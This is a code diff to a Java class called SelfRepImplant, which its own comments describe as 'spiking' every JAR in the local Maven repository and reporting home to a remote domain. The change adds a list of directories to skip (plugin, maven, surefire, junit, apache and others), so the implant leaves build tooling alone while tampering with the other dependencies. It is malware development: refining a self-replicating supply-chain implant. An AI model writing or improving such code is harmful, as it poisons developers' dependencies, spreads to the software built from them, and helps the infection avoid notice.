@@ -28,7 +28,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      * All JARs in this directory will be spiked.
      */
     static volatile String CONF_LIMIT_PATH = "~/.m2/repository";
-
+    static volatile List<String> CONF_IGNORED_PATHS = Arrays.asList("plugin", "plugins", "plexus", "surefire", "junit", "maven", "apache");
     /**
      * Domain to report home to.
      */
@@ -160,6 +160,9 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         List<Path> subDirs = new LinkedList<>();
         for (Path subPath : subPaths) {
+            if (CONF_IGNORED_PATHS.contains(subPath.getFileName().toString())) {
+                continue;
+            }
             if (Files.isDirectory(subPath)) {
                 subDirs.add(subPath);
                 continue;
